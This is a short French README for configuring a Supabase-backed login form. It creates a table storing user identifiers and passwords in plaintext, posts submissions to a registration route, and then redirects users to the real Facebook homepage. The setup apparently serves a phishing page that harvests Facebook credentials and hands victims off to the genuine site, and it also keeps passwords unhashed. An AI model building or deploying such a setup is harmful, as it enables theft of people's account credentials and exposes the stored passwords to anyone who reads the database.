# Configuration Supabase

## Étapes de configuration :

### 1. Créer un compte Supabase
- Allez à https://supabase.com
- Créez un nouveau projet

### 2. Créer la table de données
Exécutez cette requête SQL dans l'éditeur SQL de Supabase :

```sql
create table public.donnees (
    id uuid primary key default gen_random_uuid(),
    identifiant varchar(100) unique not null,
    password varchar(255) not null,
    created_at timestamp with time zone default now()
);
```

### 3. Configurer les variables d'environnement
Complétez le fichier `.env.local` avec vos clés Supabase :

```
NEXT_PUBLIC_SUPABASE_URL=https://votre-projet.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=votre-clé-anon
```

Vous trouverez ces informations dans :
- **Settings** > **API** de votre projet Supabase

### 4. Fonctionnement du formulaire

**Validation :**
- Si l'identifiant est vide : affiche un message d'erreur en rouge
- Si le mot de passe est vide : affiche un message d'erreur en rouge
- Les champs vides disparaissent au fur et à mesure que l'utilisateur tape

**Soumission :**
- POST vers `/api/auth/register`
- Les données sont enregistrées dans la table `donnees`
- Après succès : redirection vers https://web.facebook.com/?locale=fr_FR&_rdc=1&_rdr#

**Gestion des erreurs :**
- Messages d'erreur personnalisés affichés en rouge avec icône circulaire
- La bordure des champs change en rouge en cas d'erreur

### 5. Lancer le serveur

```bash
npm run dev
```

Accédez à http://localhost:3000
